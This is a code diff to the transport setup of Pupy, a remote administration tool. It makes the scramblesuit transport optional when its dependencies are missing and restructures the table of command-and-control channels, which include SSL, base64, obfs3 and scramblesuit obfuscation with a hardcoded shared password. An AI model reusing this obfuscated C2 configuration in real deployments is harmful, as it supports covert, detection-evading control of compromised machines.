@@ -5,10 +5,15 @@ from .servers import PupyTCPServer
 from .clients import PupyTCPClient, PupySSLClient
 from .transports import dummy, b64
 from .transports.obfs3 import obfs3
-from .transports.scramblesuit import scramblesuit
+import logging
+try:
+	from .transports.scramblesuit import scramblesuit
+except ImportError as e:
+	#to make pupy works even without scramblesuit dependencies
+	logging.warning("%s. The transport has been disabled."%e)
+	scramblesuit=None
 from .streams import PupySocketStream
 import os
-import logging
 try:
 	import ConfigParser as configparser
 except ImportError:
@@ -25,8 +30,9 @@ def ssl_authenticator():
 #scramblesuit password must be 20 char
 scramblesuit_passwd="th!s_iS_pupy_sct_k3y"
 
-transports={
-	"tcp_ssl" : {
+transports=dict()
+
+transports["tcp_ssl"]={
 		"server" : PupyTCPServer,
 		"client": PupySSLClient,
 		"client_kwargs" : {},
@@ -36,8 +42,8 @@ transports={
 		"server_transport" : dummy.DummyPupyTransport,
 		"client_transport_kwargs": {},
 		"server_transport_kwargs": {},
-	},
-	"tcp_cleartext" : {
+	}
+transports["tcp_cleartext"]={
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -47,8 +53,8 @@ transports={
 		"server_transport" : dummy.DummyPupyTransport,
 		"client_transport_kwargs": {},
 		"server_transport_kwargs": {},
-	},
-	"tcp_base64" : {
+	}
+transports["tcp_base64"]={
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -58,8 +64,8 @@ transports={
 		"server_transport" : b64.B64Server,
 		"client_transport_kwargs": {},
 		"server_transport_kwargs": {},
-	},
-	"obfs3" : {
+	}
+transports["obfs3"]={
 		"server" : PupyTCPServer,
 		"client": PupyTCPClient,
 		"client_kwargs" : {},
@@ -69,16 +75,17 @@ transports={
 		"server_transport" : obfs3.Obfs3Server,
 		"client_transport_kwargs": {},
 		"server_transport_kwargs": {},
-	},
-	"scramblesuit" : {
-		"server" : PupyTCPServer,
-		"client": PupyTCPClient,
-		"client_kwargs" : {},
-		"authenticator" : None,
-		"stream": PupySocketStream ,
-		"client_transport" : scramblesuit.ScrambleSuitClient,
-		"server_transport" : scramblesuit.ScrambleSuitServer,
-		"client_transport_kwargs": {"password":scramblesuit_passwd}, 
-		"server_transport_kwargs": {"password":scramblesuit_passwd},
-	},
-}
+	}
+if scramblesuit:
+	transports["scramblesuit"]={
+			"server" : PupyTCPServer,
+			"client": PupyTCPClient,
+			"client_kwargs" : {},
+			"authenticator" : None,
+			"stream": PupySocketStream ,
+			"client_transport" : scramblesuit.ScrambleSuitClient,
+			"server_transport" : scramblesuit.ScrambleSuitServer,
+			"client_transport_kwargs": {"password":scramblesuit_passwd}, 
+			"server_transport_kwargs": {"password":scramblesuit_passwd},
+		}
+
